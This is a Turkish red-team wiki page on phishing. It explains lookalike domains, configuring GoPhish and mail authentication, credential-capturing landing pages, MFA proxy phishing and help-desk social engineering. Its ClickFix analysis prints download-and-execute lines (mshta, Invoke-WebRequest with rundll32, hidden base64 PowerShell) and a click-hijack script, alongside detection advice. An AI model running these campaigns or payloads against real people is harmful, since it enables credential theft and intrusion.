# Phishing Methodology

## Methodology

1. Mağduru keşfedin
1. **Mağdur domainini** seçin.
2. Mağdur tarafından kullanılan **login portallarını arayarak** bazı temel web enumeration işlemleri gerçekleştirin ve hangisini **taklit edeceğinize** **karar verin**.
3. **E-posta adreslerini bulmak** için bazı **OSINT** teknikleri kullanın.
2. Ortamı hazırlayın
1. Phishing assessment için kullanacağınız **domaini satın alın**
2. E-posta hizmetiyle ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **yapılandırın**
3. VPS'i **gophish** ile yapılandırın
3. Campaign'i hazırlayın
1. **E-posta şablonunu** hazırlayın
2. Kimlik bilgilerini çalacak **web sayfasını** hazırlayın
4. Campaign'i başlatın!

## Benzer domain isimleri oluşturma veya güvenilir bir domain satın alma

### Domain Adı Çeşitlendirme Teknikleri

- **Keyword**: Domain adı, orijinal domainin önemli bir **keyword'ünü içerir** (ör. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Bir subdomainin **noktasını tireyle değiştirin** (ör. www-zelster.com).
- **New TLD**: Aynı domaini **yeni bir TLD** kullanarak oluşturun (ör. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle değiştirir** (ör. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain adındaki **iki harfin yerini değiştirir** (ör. zelsetr.com).
- **Singularization/Pluralization**: Domain adının sonuna “s” ekler veya sondaki “s” harfini kaldırır (ör. zeltsers.com).
- **Omission**: Domain adındaki harflerden **birini kaldırır** (ör. zelser.com).
- **Repetition:** Domain adındaki harflerden **birini tekrarlar** (ör. zeltsser.com).
- **Replacement**: Homoglyph tekniğine benzer ancak daha az gizlidir. Domain adındaki harflerden birini, örneğin klavyede orijinal harfin yakınındaki bir harfle değiştirir (ör. zektser.com).
- **Subdomained**: Domain adının içine bir **nokta** ekler (ör. ze.lster.com).
- **Insertion**: Domain adına bir harf **ekler** (ör. zerltser.com).
- **Missing dot**: TLD'yi domain adına ekler. (ör. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Güneş patlamaları, kozmik ışınlar veya donanım hataları gibi çeşitli faktörler nedeniyle depolanan veya iletişim hâlindeki bazı bitlerin **otomatik olarak değişme olasılığı vardır**.

Bu kavram **DNS isteklerine uygulandığında**, **DNS sunucusu tarafından alınan domainin**, başlangıçta istenen domain ile aynı olmaması mümkündür.

Örneğin, "windows.com" domaininde tek bir bitin değiştirilmesi onu "windnws.com" olarak değiştirebilir.

Saldırganlar, mağdurun domainine benzeyen **birden fazla bit-flipping domaini kaydederek** bundan yararlanabilir. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) adresini okuyun.<sup>[[10]](#references)[[11]](#references)</sup>

### Güvenilir bir domain satın alma

Kullanabileceğiniz süresi dolmuş bir domaini [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arayabilirsiniz.\
Satın alacağınız süresi dolmuş domainin **zaten iyi bir SEO değerine sahip olduğundan** emin olmak için aşağıdaki hizmetlerde nasıl kategorize edildiğini arayabilirsiniz:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-posta Adreslerini Keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (%100 ücretsiz)
- [https://phonebook.cz/](https://phonebook.cz) (%100 ücretsiz)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli e-posta adresi **keşfetmek** veya daha önce keşfettiğiniz adresleri **doğrulamak** için mağdurun SMTP sunucularında brute-force yapıp yapamayacağınızı kontrol edebilirsiniz. [E-posta adreslerini nasıl doğrulayacağınızı/keşfedeceğinizi buradan öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca kullanıcılar e-postalarına erişmek için **herhangi bir web portalı kullanıyorsa**, bu portalın **username brute force** saldırısına karşı savunmasız olup olmadığını kontrol edebilir ve mümkünse bu zafiyetten yararlanabilirsiniz.

## GoPhish'i Yapılandırma

### Kurulum

Bunu [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsiniz.

İndirin, `/opt/gophish` içine açın ve `/opt/gophish/gophish` dosyasını çalıştırın.\
Çıktıda 3333 portundaki admin kullanıcısı için bir parola verilecektir. Bu nedenle ilgili porta erişin ve admin parolasını değiştirmek için bu kimlik bilgilerini kullanın. Bu portu local'e tunnel etmeniz gerekebilir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Yapılandırma

**TLS sertifikası yapılandırması**

Bu adımdan önce, kullanacağınız **domain'i** **satın almış** olmanız ve domain'in, **gophish** yapılandırmasını yaptığınız VPS'in **IP adresine yönleniyor** olması gerekir.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**E-posta yapılandırması**

Kurulumu başlatın: `apt-get install postfix`

Ardından domain'i aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** içindeki aşağıdaki değişkenlerin değerlerini de değiştirin:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınızla değiştirin ve **VPS'nizi yeniden başlatın.**

Şimdi, `mail.<domain>` için VPS'nin **IP adresine** yönlendiren bir **DNS A kaydı** ve `mail.<domain>` adresine yönlendiren bir **DNS MX** kaydı oluşturun.

Şimdi bir e-posta göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish yapılandırması**

Gophish'in çalışmasını durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki şekilde değiştirin (`https` kullanımına dikkat edin):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service'ini yapılandırma**

gophish service'ini otomatik olarak başlatılabilen ve bir service olarak yönetilebilen şekilde oluşturmak için `/etc/init.d/gophish` dosyasını aşağıdaki içerikle oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Şunları yaparak hizmeti yapılandırmayı ve kontrol etmeyi tamamlayın:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail server ve domain yapılandırma

### Bekleyin ve meşru görünün

Bir domain ne kadar eskiyse spam olarak algılanma olasılığı o kadar düşüktür. Bu nedenle phishing assessment öncesinde mümkün olduğunca uzun süre (en az 1 hafta) beklemelisiniz. Ayrıca, itibarlı bir sektör hakkında bir sayfa oluşturursanız elde edilen itibar daha iyi olacaktır.

Bir hafta beklemeniz gerekse bile her şeyi şimdi yapılandırmayı tamamlayabileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydını yapılandırma

VPS'nin IP adresini domain adına çözecek bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) Record

**Yeni domain için bir SPF record yapılandırmalısınız**. SPF record'un ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF policy'nizi oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) kullanabilirsiniz (VPS makinesinin IP'sini kullanın)

![Bir phishing domain'i için SPF record oluşturma SPF Wizard formu](<../../images/image (1037).png>)

Domain içinde bir TXT record'un içine ayarlanması gereken içerik şudur:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

**Yeni domain için bir DMARC record yapılandırmalısınız**. DMARC record'un ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

`_dmarc.<domain>` hostname'ine işaret eden ve aşağıdaki içeriğe sahip yeni bir DNS TXT record oluşturmalısınız:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**Yeni domain için bir DKIM yapılandırmanız gerekir**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu tutorial şu kaynağı temel alır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM key'in oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Email yapılandırmanızın skorunu test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sayfaya erişin ve size verilen adrese bir email gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta göndererek **e-posta yapılandırmanızı kontrol edebilir** ve **yanıtı okuyabilirsiniz** (bunun için **25** numaralı portu **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizi kontrol edin:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ayrıca **kontrolünüz altındaki bir Gmail hesabına mesaj gönderebilir** ve Gmail gelen kutunuzdaki **e-postanın başlıklarını** kontrol edebilirsiniz; `Authentication-Results` başlık alanında `dkim=pass` bulunmalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhaus Blacklist'ten Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, domain'inizin spamhaus tarafından engellenip engellenmediğini belirtebilir. Domain/IP adresinizin kaldırılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist'ten Kaldırma

​​Domain/IP adresinizin kaldırılmasını [https://sender.office.com/](https://sender.office.com) adresinden talep edebilirsiniz.

## GoPhish Campaign Oluşturma ve Başlatma

### Gönderim Profili

- Gönderici profilini tanımlamak için bir **isim** belirleyin
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Kullanıcı adı ve parolayı boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![GoPhish Campaign Oluşturma ve Başlatma - Gönderim Profili: Kullanıcı adı ve parolayı boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Testler gerçekleştirirken blacklist'e alınmanızı önlemek için test e-postalarını **10min mail adreslerine** göndermenizi öneririm.

### E-posta Şablonu

- Şablonu tanımlamak için bir **isim** belirleyin
- Ardından bir **konu** yazın (olağandışı bir şey olmasın; normal bir e-postada okumayı bekleyebileceğiniz bir şey yazın)
- "**Add Tracking Image**" seçeneğinin işaretli olduğundan emin olun
- **E-posta şablonunu** yazın (aşağıdaki örnekte olduğu gibi değişkenleri kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
E-postanın **güvenilirliğini artırmak için**, istemciden gelen bir e-postadaki imzalardan birini kullanmanız önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtın herhangi bir imza içerip içermediğini kontrol edin.
- info@ex.com, press@ex.com veya public@ex.com gibi **herkese açık e-posta adreslerini** bulun, bunlara e-posta gönderin ve yanıtı bekleyin.
- **Bulduğunuz geçerli** bir e-posta adresiyle iletişime geçmeyi deneyin ve yanıtı bekleyin.

![Gönderim Profili - E-posta Şablonu: Bulduğunuz geçerli bir e-posta adresiyle iletişime geçmeyi deneyin ve yanıtı bekleyin](<../../images/image (80).png>)

> [!TIP]
> E-posta Şablonu, **gönderilecek dosyaların eklenmesine** de olanak tanır. Özel olarak hazırlanmış bazı dosya/belgeleri kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **ad** yazın
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **içe aktarabileceğinizi** unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin
- Bir **yönlendirme** ayarlayın

![E-posta Şablonu - Landing Page: Capture Submitted Data ve Capture Passwords seçeneklerini işaretleyin](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve **sonuçları beğenene kadar** yerel ortamda (belki bir Apache server kullanarak) bazı testler yapmanız gerekir. Ardından bu HTML kodunu kutuya yazın.\
> HTML için bazı **statik kaynakları** (örneğin bazı CSS ve JS sayfalarını) kullanmanız gerekiyorsa bunları _**/opt/gophish/static/endpoint**_ konumuna kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Yönlendirme için **kullanıcıları mağdurun meşru ana web sayfasına** yönlendirebilir veya örneğin onları _/static/migration.html_ adresine yönlendirip 5 saniye boyunca bir **dönen yükleme simgesi (**[**https://loading.io/**](https://loading.io)**) gösterdikten sonra işlemin başarılı olduğunu belirtebilirsiniz**.

### Users & Groups

- Bir ad belirleyin
- **Verileri içe aktarın** (örnekteki şablonu kullanabilmek için her kullanıcının firstname, last name ve email address bilgilerine ihtiyacınız olduğunu unutmayın)

![Landing Page - Users & Groups: Verileri içe aktarın (örnekteki şablonu kullanabilmek için her kullanıcının firstname, last name ve email address bilgilerine ihtiyacınız olduğunu unutmayın)](<../../images/image (163).png>)

### Campaign

Son olarak bir ad, e-posta şablonu, landing page, URL, gönderim profili ve grup seçerek bir campaign oluşturun. URL'nin mağdurlara gönderilecek bağlantı olacağını unutmayın.

**Sending Profile'ın son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını** unutmayın:

![Users & Groups - Campaign: Sending Profile'ın son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını unutmayın](<../../images/image (192).png>)

Her şey hazır olduğunda campaign'i başlatın!

## Website Cloning

Herhangi bir nedenle web sitesini clone etmek istiyorsanız aşağıdaki sayfaya bakın:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing değerlendirmelerinde (özellikle Red Team'ler için) bir tür **backdoor içeren dosyalar** (belki bir C2 veya yalnızca bir authentication tetikleyecek bir dosya) göndermek de isteyebilirsiniz.\
Bazı örnekler için aşağıdaki sayfaya bakın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki saldırı oldukça zekicedir; gerçek bir web sitesini taklit eder ve kullanıcı tarafından girilen bilgileri toplarsınız. Ne yazık ki kullanıcı doğru password'ü girmezse veya taklit ettiğiniz application 2FA ile yapılandırılmışsa, **bu bilgiler kandırılan kullanıcıyı taklit etmenize olanak sağlamaz**.

[**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi araçlar burada kullanışlıdır. Bu araç, MitM benzeri bir saldırı oluşturmanıza olanak tanır. Temel olarak saldırılar şu şekilde çalışır:

1. Gerçek web sayfasının login formunu **taklit edersiniz**.
2. Kullanıcı **credential'larını** sahte sayfanıza **gönderir**; araç bunları gerçek web sayfasına göndererek **credential'ların çalışıp çalışmadığını kontrol eder**.
3. Hesap 2FA ile yapılandırılmışsa MitM sayfası bunu ister ve **kullanıcı girdiğinde** araç bunu gerçek web sayfasına gönderir.
4. Kullanıcı authenticated olduğunda siz (saldırgan olarak), araç MitM gerçekleştirirken yapılan her etkileşime ait **credential'ları, 2FA'yı, cookie'yi ve tüm bilgileri ele geçirmiş olursunuz**.

### Via VNC

**Mağduru orijinal siteyle aynı görünüme sahip kötü amaçlı bir sayfaya göndermek** yerine, onu **gerçek web sayfasına bağlı bir browser içeren bir VNC oturumuna** gönderirseniz ne olur? Kullanıcının yaptıklarını görebilir, password'ünü, kullandığı MFA'yı, cookie'lerini ve diğer bilgileri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>

## Tespiti tespit etme

Açığa çıktığınızı anlamanın en iyi yollarından biri, **domain'inizi blacklist'lerde aramaktır**. Listeleniyorsa domain'iniz bir şekilde şüpheli olarak tespit edilmiştir.\
Domain'inizin herhangi bir blacklist'te görünüp görünmediğini kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) kullanmaktır.

Ancak mağdurun **açık phishing faaliyetlerini aktif olarak arayıp aramadığını** anlamanın başka yolları da vardır; bunlar aşağıdaki sayfada açıklanmıştır:


{{#ref}}
detecting-phising.md
{{#endref}}

Mağdurun domain'ine **çok benzer bir ada sahip bir domain satın alabilir** ve/veya sizin kontrolünüzdeki bir domain'in **subdomain'i** için mağdurun domain'inin **keyword'ünü içeren** bir certificate oluşturabilirsiniz. **Mağdur** bunlarla herhangi bir **DNS veya HTTP etkileşimi** gerçekleştirirse, onun şüpheli domain'leri **aktif olarak aradığını** anlayabilir ve çok gizli hareket etmeniz gerekir.<sup>[[2]](#references)</sup>

### Phishing'i değerlendirme

E-postanızın spam klasörüne düşüp düşmeyeceğini veya engellenip engellenmeyeceğini ya da başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set'ler, MFA'yı aşmak için email lure'larını tamamen atlayarak **doğrudan service-desk / identity-recovery workflow'unu hedef almaya** giderek daha fazla yöneliyor. Saldırı tamamen "living-off-the-land" yaklaşımındadır: operator geçerli credential'lara sahip olduğunda yerleşik admin tooling kullanarak pivot eder; malware gerekmez.<sup>[[6]](#references)</sup>

### Attack flow
1. Mağdur hakkında recon yapın
* LinkedIn, data breach'leri, public GitHub vb. kaynaklardan kişisel ve kurumsal bilgileri toplayın.
* Değeri yüksek identity'leri (executive'ler, IT, finance) belirleyin ve password / MFA reset için **tam help-desk sürecini** çıkarın.
2. Gerçek zamanlı social engineering
* Hedefi taklit ederek help-desk'i telefonla, Teams üzerinden veya chat ile arayın (genellikle **spoofed caller-ID** veya **cloned voice** kullanarak).
* Knowledge-based verification'ı geçmek için önceden toplanan PII'yi sağlayın.
* Agent'ı **MFA secret'ını resetlemeye** veya kayıtlı bir mobile number üzerinde **SIM-swap** gerçekleştirmeye ikna edin.
3. Hemen gerçekleştirilen post-access işlemleri (gerçek vakalarda ≤60 dakika)
* Herhangi bir web SSO portalı üzerinden bir foothold oluşturun.
* Yerleşik araçlarla AD / AzureAD'yi enumerate edin (binary bırakılmaz):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortamda zaten whitelist'e alınmış **WMI**, **PsExec** veya meşru **RMM** agent'larıyla lateral movement gerçekleştirin.

### Detection & Mitigation
* Help-desk identity recovery işlemini **privileged operation** olarak ele alın; step-up auth ve manager approval gerektirin.
* Şunlarda uyarı veren **Identity Threat Detection & Response (ITDR)** / **UEBA** kuralları uygulayın:
* MFA method değişti + yeni device / geo üzerinden authentication.
* Aynı principal'ın hemen elevation işlemine tabi tutulması (user-→-admin).
* Help-desk çağrılarını kaydedin ve herhangi bir reset işleminden önce **önceden kayıtlı bir numaraya call-back** yapılmasını zorunlu tutun.
* Newly reset edilmiş hesapların yüksek yetkili token'ları otomatik olarak devralmaması için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew'ler, **search engine'lerini ve ad network'lerini delivery channel'a** dönüştüren kitlesel saldırılarla high-touch operasyonların maliyetini dengeler.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi sahte bir sonucu search ad'lerinin en üstüne taşır.
2. Mağdur küçük bir **first-stage loader** (genellikle JS/HTA/ISO) indirir. Unit 42 tarafından görülen örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader, browser cookie'lerini ve credential DB'lerini exfiltrate eder; ardından gerçek zamanlı olarak deploy edilip edilmeyeceğine karar veren bir **silent loader** indirir:
* RAT (ör. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Yeni kaydedilmiş domain'leri block edin ve e-mail'in yanı sıra *search-ad'leri* üzerinde de **Advanced DNS / URL Filtering** uygulayın.
* Software installation işlemini signed MSI / Store package'leriyle sınırlandırın; `HTA`, `ISO`, `VBS` execution işlemlerini policy ile deny edin.
* Installer'ları açan browser child process'lerini izleyin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* First-stage loader'lar tarafından sıkça abuse edilen LOLBin'leri (ör. `regsvr32`, `curl`, `mshta`) hunt edin.

### TDS handoff ile Download-button click hijacking
Bazı sahte software portal'ları, görünür download `href`'ini **gerçek GitHub/release URL'sine** yönlendirmeye devam eder; ancak JavaScript'te kullanıcının **ilk etkileşimini** hijack ederek mağduru bunun yerine bir **Traffic Distribution System (TDS)** zincirine gönderir.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Temel özellikler:
- Hook genellikle `document` üzerinde **capture phase** (`true`) içinde çalışır; böylece site handler'larından önce tetiklenir.
- Chrome, redirect'i geçerli bir **user gesture** ile ilişkilendirmek ve popup-blocker bypass özelliğini iyileştirmek için çoğunlukla `click` yerine `mousedown` kullanır.
- Bazı varyantlar `about:blank` sayfasını önceden açar veya `<a target="_blank">` tıklamalarını taklit eder ve TDS URL'sini yalnızca daha sonra atar.
- Browser-side limitler genellikle `localStorage` içinde tutulur; bu nedenle **first click** malware'e ulaşabilirken refresh/retry işlemleri benign görünümlü görünür bağlantıya geri dönebilir.
- TDS; referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter kontrolleri, click context ve oturum başına sayaçlarla filtreleme yapabilir. Bu durum analyst replay işlemlerini deterministik olmaktan çıkarır.

Defender fikirleri:
- **Görüntülenen** `href` ile click sırasında oluşturulan **gerçek** navigation target değerini karşılaştırın.
- Hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran ve `window.open`, `about:blank` veya taklit edilmiş anchor click işlemleri çevresinde çalışan `document.addEventListener(..., true)` handler'larını araştırın.
- Yeni kaydedilen ve tümü aynı CloudFront/JS stage'i yükleyen software-download domain kümelerini, yüksek güvenilirlikli bir SEO-poisoning/TDS pattern'i olarak değerlendirin.

### Sahte verification page'lerden ClickFix + archive görünümlü LOLBAS fetch işlemleri
Bazı TDS dalları, kurbandan aşağıdaki gibi trusted bir Windows binary çalıştırmasını isteyen sahte bir verification page ile (Cloudflare/IUAM tarzı) sona erer:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notlar:
- `mshta.exe`, URL `.7z` arşivi gibi görünse bile yanıtın **başındaki HTA/VBScript'i** çalıştırır; sonuna eklenen arşiv verileri tamamen yanıltıcı olabilir.
- Sonraki aşamalar genellikle dosya türü hakkında yanıltmaya devam eder (`.rtf` ile PowerShell, `.asar` ile Python, padding uygulanmış binary'ler içeren ZIP'ler) ve ardından **manual PE mapping / in-memory execution** yöntemlerine geçer.
- Bu zincirlerden birine yanıt veriyorsanız, **ilk başarılı çalıştırmadaki network + memory verilerini** koruyun: sonraki tekrarlar yalnızca zararsız bir installer/SFX yolu gösterebilir veya payload/key release orijinal TDS session'a bağlı olduğu için başarısız olabilir.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Yem: **Update** düğmesi bulunan ve adım adım “fix” talimatlarını gösteren, kopyalanmış bir ulusal CERT advisory'si. Victim'lere bir DLL indiren ve bunu `rundll32` üzerinden çalıştıran bir batch çalıştırmaları söylenir.<sup>[[12]](#references)</sup>
* Gözlemlenen tipik batch chain:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload'u `%TEMP%` konumuna bırakır, kısa bir bekleme network jitter'ını gizler, ardından `rundll32` export edilen entrypoint'i (`notepad`) çağırır.
* DLL host identity bilgisini beacon olarak gönderir ve birkaç dakikada bir C2'yi poll eder. Remote tasking, gizli şekilde ve policy bypass ile çalıştırılan **base64-encoded PowerShell** olarak gelir:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Bu yöntem C2 esnekliğini korur (server, DLL'yi güncellemeden task'leri değiştirebilir) ve console window'larını gizler. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` seçeneklerini birlikte kullanan `rundll32.exe` child process'lerini arayın.
